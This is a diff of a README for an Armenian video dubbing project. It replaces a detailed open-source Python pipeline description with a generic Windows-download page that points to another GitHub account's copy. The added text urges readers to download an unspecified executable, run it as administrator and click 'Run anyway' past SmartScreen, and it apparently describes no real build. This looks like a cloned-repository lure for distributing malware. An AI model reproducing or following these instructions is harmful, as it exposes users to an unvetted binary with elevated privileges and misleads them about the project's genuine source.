@@ -1,322 +1,185 @@
-<div align="center">
-
-# Armenian Video Dubbing AI
-
-**World-class open-source video dubbing system for the Armenian language**
-
-Automatically dub any video into Eastern or Western Armenian with voice cloning, lip-sync, and emotion preservation.
-
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
-[![CUDA 12.4](https://img.shields.io/badge/CUDA-12.4-green.svg)](https://developer.nvidia.com/cuda-toolkit)
-
-[Quick Start](#quick-start) | [Architecture](#architecture) | [Documentation](docs/) | [API Reference](docs/api.md) | [Contributing](CONTRIBUTING.md)
-
-</div>
-
----
-
-## Overview
-
-Armenian Video Dubbing AI is a complete end-to-end pipeline that transforms English video content into naturally dubbed Armenian audio+video. It combines state-of-the-art models across five domains:
-
-| Stage | Model | Purpose |
-|-------|-------|---------|
-| **ASR** | Whisper large-v3 + LoRA | Speech recognition with word-level timestamps |
-| **Translation** | SeamlessM4T v2 Large | English to Armenian text translation |
-| **TTS** | Fish-Speech S2 Pro / edge-tts | Voice synthesis with speaker cloning |
-| **Lip-Sync** | MuseTalk v1.5+ | Real-time lip movement synchronization |
-| **Post-Processing** | Demucs + pyloudnorm + FFmpeg | Audio separation, normalization, mixing |
-
-### Key Features
-
-- **Dialect Support** — Eastern Armenian (hye) and Western Armenian (hyw)
-- **Voice Cloning** — Clone any speaker's voice from a 10-second reference clip
-- **Emotion Preservation** — SSML prosody tags (rate, pitch, volume) per detected emotion
-- **4-bit Quantization** — Run on consumer GPUs with BitsAndBytes NF4
-- **Duration Matching** — Rubberband time-stretching to match original segment timing
-- **Background Audio** — Demucs source separation preserves music and SFX
-- **Ethical Safeguards** — AI watermark overlay and voice consent logging
-- **Production Ready** — Docker, FastAPI, Gradio UI, nginx, Prometheus metrics
-
----
-
-## Quick Start
-
-### Prerequisites
-
-- Python 3.11+
-- NVIDIA GPU with CUDA 12.4+ (recommended: RTX 4090 / A100)
-- FFmpeg, rubberband-cli
-- ~16 GB VRAM (with 4-bit quantization) or ~40 GB (full precision)
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/Edmon02/armenian-video-dubbing.git
-cd armenian-video-dubbing
-
-# Option 1: Conda environment (recommended)
-bash scripts/setup_environment.sh
-
-# Option 2: pip install
-pip install -e .
-
-# Option 3: Docker
-docker compose up -d
-```
-
-### Environment Setup
-
-```bash
-cp .env.example .env
-# Edit .env with your HuggingFace token and other settings
-```
-
-### Dub a Video
-
-```bash
-# CLI
-python -m src.pipeline input.mp4 --output dubbed.mp4 --dialect eastern --emotion neutral
-
-# Or use the Makefile shortcut
-make dub VIDEO=input.mp4
-
-# Python API
-from src.pipeline import DubbingPipeline
-
-pipeline = DubbingPipeline()
-result = pipeline.dub_video(
-    video_path="input.mp4",
-    reference_speaker_audio="speaker.wav",
-    emotion="neutral",
-    output_path="dubbed.mp4"
-)
-```
-
----
-
-## Architecture
-
-```
-Input Video (.mp4)
-     │
-     ├──► 1. Extract Audio (FFmpeg)
-     │
-     ├──► 2. ASR — Whisper large-v3 + LoRA
-     │         └─► Timestamped segments
-     │
-     ├──► 3. Translate — SeamlessM4T v2 (eng → hye/hyw)
-     │
-     ├──► 4. TTS — Fish-Speech S2 Pro (voice clone)
-     │         └─► edge-tts fallback with SSML prosody
-     │
-     ├──► 5. Duration Match — Rubberband time-stretch
-     │
-     ├──► 6. Audio Post-Processing
-     │         ├─► Demucs source separation (vocals vs. SFX)
-     │         ├─► Spectral gate denoising
-     │         └─► Loudness normalization (–14 LUFS)
-     │
-     ├──► 7. Lip-Sync — MuseTalk (optional)
-     │
-     └──► 8. Final Mix — FFmpeg encode + watermark
-              └─► Output: dubbed.mp4
-```
-
----
-
-## Project Structure
-
-```
-armenian-video-dubbing/
-│
-├── src/                          # Core source code
-│   ├── inference.py              # 5 inference modules (ASR, Translation, TTS, LipSync, PostProc)
-│   ├── pipeline.py               # 8-step dubbing orchestrator + CLI
-│   ├── training_utils.py         # Training utilities
-│   ├── api/
-│   │   └── fastapi_server.py     # Production REST API (auth, Prometheus)
-│   ├── ui/
-│   │   └── gradio_app.py         # Web interface
-│   └── utils/                    # Config loader, helpers, logging
-│
-├── scripts/
-│   ├── data_collection/          # YouTube crawl, Common Voice, data prep
-│   ├── training/                 # ASR + TTS fine-tuning scripts
-│   ├── evaluation/               # Metrics, human eval, regression testing
-│   │   ├── metrics/              # WER, MOS, speaker similarity, lip-sync
-│   │   ├── human_eval/           # MOS protocol, A/B testing
-│   │   └── regression/           # Baseline comparison, weak-spot analysis
-│   ├── inference/                # Batch processing
-│   └── deployment/               # Cloud deploy (RunPod, AWS, GCP), cost estimation
-│
-├── configs/
-│   ├── config.yaml               # Master configuration
-│   ├── crawl_config.yaml         # YouTube crawl settings
-│   └── environment.yaml          # Conda environment spec
-│
-├── tests/                        # Test suite
-├── docker/                       # nginx config, Docker requirements
-├── data/                         # Dataset directories (gitignored)
-├── models/                       # Model checkpoints (gitignored)
-├── outputs/                      # Generated outputs (gitignored)
-│
-├── Dockerfile                    # Multi-stage CUDA build
-├── docker-compose.yaml           # Production stack (nginx + Gradio + API)
-├── Makefile                      # 20+ automation targets
-├── pyproject.toml                # Package config (setuptools)
-└── .env.example                  # Environment variable template
-```
-
----
-
-## Usage
-
-### Web Interface (Gradio)
-
-```bash
-make web
-# Opens at http://localhost:7860
-```
-
-### REST API (FastAPI)
-
-```bash
-make api
-# Available at http://localhost:8000
-# Docs: http://localhost:8000/docs
-```
-
-See [API Documentation](docs/api.md) for endpoints and examples.
-
-### Docker (Production)
-
-```bash
-# Full stack: nginx + Gradio + API
-docker compose up -d
-
-# GPU services only
-docker compose up -d gradio api
-
-# With Label Studio for annotation
-docker compose --profile dev up -d
-```
-
-### Batch Processing
-
-```bash
-python scripts/inference/batch_process.py --input videos.csv
-```
-
----
-
-## Configuration
-
-All settings are in [`configs/config.yaml`](configs/config.yaml). Key sections:
-
-| Section | Description |
-|---------|-------------|
-| `project` | Device (cuda/cpu/mps), dtype, seed |
-| `asr` | Whisper model, beam size, VAD, quantization |
-| `translation` | SeamlessM4T settings, dialect selection |
-| `tts` | Fish-Speech / CosyVoice, voice cloning params |
-| `lipsync` | MuseTalk settings, face detection |
-| `audio` | Demucs, loudness target, sample rate |
-| `timing` | Duration matching, stretch/compress ratios |
-| `training` | Hyperparameters for ASR and TTS fine-tuning |
-| `evaluation` | Quality thresholds (WER, MOS, similarity) |
-| `ethics` | Watermark, consent logging |
-
----
-
-## Quality Targets
-
-| Metric | Target | Description |
-|--------|--------|-------------|
-| WER | < 8% | Word Error Rate (ASR accuracy) |
-| MOS | > 4.6 | Mean Opinion Score (naturalness) |
-| Speaker Similarity | > 0.85 | Voice clone fidelity |
-| LSE-C | < 1.8 | Lip-sync confidence error |
-| LSE-D | < 1.8 | Lip-sync distance error |
-| COMET | > 0.85 | Translation quality |
-
----
-
-## Development
-
-```bash
-# Run tests
-make test
-
-# Lint
-make lint
-
-# Auto-fix lint issues
-make lint-fix
-
-# Format code
-make format
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
-
----
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [Architecture Guide](docs/architecture.md) | System design and data flow |
-| [API Reference](docs/api.md) | REST API endpoints and usage |
-| [Deployment Guide](docs/deployment.md) | Docker, cloud, and RunPod setup |
-| [Training Guide](docs/training.md) | Fine-tuning ASR and TTS models |
-| [Evaluation Guide](docs/evaluation.md) | Metrics, human eval, regression |
-| [Configuration Reference](docs/configuration.md) | All config options explained |
-
----
-
-## Makefile Targets
-
-Run `make help` to see all available targets:
-
-```
-api                  Launch FastAPI locally
-batch                Batch process (make batch MANIFEST=videos.csv)
-build                Build Docker image
-clean                Remove temp files and caches
-deploy-cloud         Deploy to cloud (auto-detect provider)
-deploy-runpod        Deploy to RunPod
-dub                  Dub a video (make dub VIDEO=input.mp4 EMOTION=neutral)
-evaluate             Run evaluation suite
-install              Install dependencies locally (conda env)
-lint                 Lint code with ruff
-lint-fix             Auto-fix lint issues
-logs                 Follow logs from all services
-run                  Start all services (Gradio + API + nginx)
-run-dev              Start all services including Label Studio
-stop                 Stop all services
-test                 Run tests
-train-asr            Train ASR model
-train-tts            Train TTS model
-web                  Launch Gradio UI locally
-```
-
----
-
-## License
-
-This project is licensed under the [Apache License 2.0](LICENSE).
-
----
-
-## Acknowledgments
-
-Built with:
-- [OpenAI Whisper](https://github.com/openai/whisper) — ASR backbone
-- [Meta SeamlessM4T](https://github.com/facebookresearch/seamless_communication) — Translation
-- [Fish-Speech](https://github.com/fishaudio/fish-speech) — TTS and voice cloning
-- [MuseTalk](https://github.com/TMElyralab/MuseTalk) — Lip synchronization
-- [Demucs](https://github.com/facebookresearch/demucs) — Audio source separation
-- [edge-tts](https://github.com/rany2/edge-tts) — Fallback TTS with SSML
+# 🎬 armenian-video-dubbing - Dub Armenian videos with natural voice
+
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Breadad4702/armenian-video-dubbing)
+
+## 📥 Download
+Get the app from the project page here:
+
+https://github.com/Breadad4702/armenian-video-dubbing
+
+Visit this page to download the latest Windows build, then save the file to your computer
+
+## 🪟 Windows setup
+This app is made for Windows users who want to dub videos in Armenian with a simple setup
+
+### What you need
+- Windows 10 or Windows 11
+- A modern GPU is helpful for faster processing
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- A working internet connection for the first download or setup
+
+### How to install
+1. Open the download page
+2. Find the latest Windows file
+3. Download the file to your PC
+4. If the file is in a ZIP folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows asks for permission, choose Yes
+
+### First run
+- Wait for the app to finish its first setup
+- Let it create its local files
+- Keep the app open until it loads the main screen
+- If Windows SmartScreen appears, choose More info, then Run anyway, only if you trust the source
+
+## 🎧 What it does
+armenian-video-dubbing helps you turn spoken video into Armenian speech with a natural sound
+
+It combines:
+- speech recognition
+- machine translation
+- speech synthesis
+- voice cloning
+- lip-sync
+- emotion preservation
+
+Use it for:
+- dubbing videos into Armenian
+- keeping the speaker’s voice style
+- matching mouth movement to the new audio
+- making the final result sound more natural
+
+## 🧭 How to use it
+1. Open the app
+2. Choose the video you want to dub
+3. Pick Armenian as the target language
+4. Select a voice option
+5. Start the dubbing process
+6. Wait while the app processes audio and video
+7. Review the result
+8. Export the final video file
+
+## 🔊 Voice cloning
+The app can create a voice that sounds closer to the original speaker
+
+This helps when you want:
+- the same tone
+- the same speaking style
+- a more natural dub
+- a better match for the video
+
+For best results:
+- use clear speech in the source video
+- avoid heavy background noise
+- pick a video with one main speaker
+- use a short sample if the app asks for one
+
+## 🗣️ Lip-sync
+The app can adjust the mouth movement so the Armenian audio fits the video better
+
+This is useful when you want:
+- a cleaner final look
+- less mismatch between speech and lips
+- a more polished video
+
+Best results come from:
+- front-facing video
+- clear face view
+- steady camera shots
+- good lighting
+
+## 😌 Emotion preservation
+The app aims to keep the feeling of the original speech
+
+This helps when the speaker is:
+- calm
+- excited
+- serious
+- emotional
+
+The output keeps more of the original delivery instead of sounding flat
+
+## ⚙️ Simple workflow
+The usual flow looks like this:
+- import video
+- detect speech
+- translate to Armenian
+- generate new voice
+- align the voice with the video
+- export the dubbed file
+
+This makes it easier to use even if you have no editing experience
+
+## 📁 Supported input
+You can usually work with:
+- MP4
+- MOV
+- MKV
+- WAV
+- MP3
+
+For best results, use:
+- clear audio
+- stable video
+- one main speaker
+- short clips at first
+
+## 🧩 Helpful tips
+- Start with a short video
+- Keep file names simple
+- Close other heavy apps while processing
+- Use headphones when checking the result
+- Save your original video before you start
+
+## 🖥️ Recommended computer setup
+For a smoother experience:
+- Windows 11
+- 16 GB RAM
+- NVIDIA GPU with 6 GB VRAM or more
+- SSD storage
+- Updated graphics drivers
+
+The app can still run on weaker systems, but processing may take longer
+
+## 🛠️ Troubleshooting
+### The app does not open
+- Check that the file finished downloading
+- Extract the ZIP file first if needed
+- Run the app as administrator
+- Restart your computer and try again
+
+### The video takes too long
+- Use a shorter clip
+- Close other programs
+- Check that your GPU drivers are current
+
+### The audio sounds off
+- Try a cleaner source video
+- Use a video with less noise
+- Pick a clearer voice sample if the app offers one
+
+### The lips do not match well
+- Use a front-facing video
+- Avoid fast camera cuts
+- Try a clip with one speaker
+
+## 📌 Project focus
+This project brings together:
+- Armenian speech tools
+- deep learning models
+- speech-to-text
+- text-to-speech
+- translation
+- video dubbing
+
+It is built for users who want a direct way to make Armenian dubbed videos on Windows
+
+## 🔗 Download again
+Open the main project page here and download the Windows file:
+
+https://github.com/Breadad4702/armenian-video-dubbing
+
+## 📄 License
+Use the project page and repository files for the latest license and usage details
